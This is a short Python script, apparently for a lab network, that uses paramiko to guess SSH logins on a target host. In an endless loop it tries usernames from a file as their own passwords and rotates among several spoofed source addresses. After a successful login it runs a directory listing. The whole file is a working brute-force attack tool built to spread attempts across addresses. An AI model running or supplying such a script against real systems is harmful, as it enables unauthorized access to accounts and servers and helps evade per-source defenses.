import paramiko
import sys
import socket
import time
import random

IP_LISTS = [
    "10.1.32.10",
    "10.1.32.11",
    "10.1.32.12",
    "10.1.32.13",
    "10.1.32.14"
]

with open('./user_list.txt') as f:
    user_list = f.read().split()

print(user_list)

TARGET="10.1.2.1"


while True:
    source_ip = random.choice(IP_LISTS)
    print("source ip is {}".format(source_ip))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((source_ip, 0))
    sock.connect(("10.1.2.1", 22))

    print("a")
    usr = random.choice(user_list)
    print("trying... user:{}".format(usr))
    with paramiko.SSHClient() as ssh:
        ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
        ssh.connect(hostname=TARGET, username=usr, password=usr, sock=sock)

        print(ssh)
        _, stdout, _ = ssh.exec_command("ls -al")
        print(stdout.read())
    sock.close()
    time.sleep(1)
